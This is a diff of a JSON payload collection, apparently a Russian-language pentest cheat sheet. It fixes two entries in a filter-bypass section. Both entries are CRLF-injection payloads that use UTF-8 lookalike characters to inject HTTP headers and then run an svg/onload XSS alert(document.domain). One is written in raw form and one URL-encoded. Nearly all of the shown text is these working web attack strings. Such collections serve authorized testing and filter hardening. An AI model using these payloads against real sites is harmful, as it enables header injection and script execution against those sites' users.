@@ -89,14 +89,14 @@
       "title": "Полезная нагрузка из UTF-8 символов (svg/onload)",
       "language": "text",
       "tags": ["crlf", "filter-bypass", "utf-8", "xss"],
-      "body": "嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾"
+      "body": "嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain)嘾"
     },
     {
       "subcategory": "Обход фильтров",
       "title": "Та же нагрузка в URL-кодировке",
       "language": "text",
       "tags": ["crlf", "filter-bypass", "utf-8", "xss"],
-      "body": "%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE"
+      "body": "%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%29%E5%98%BE"
     },
     {
       "subcategory": "Обход фильтров",
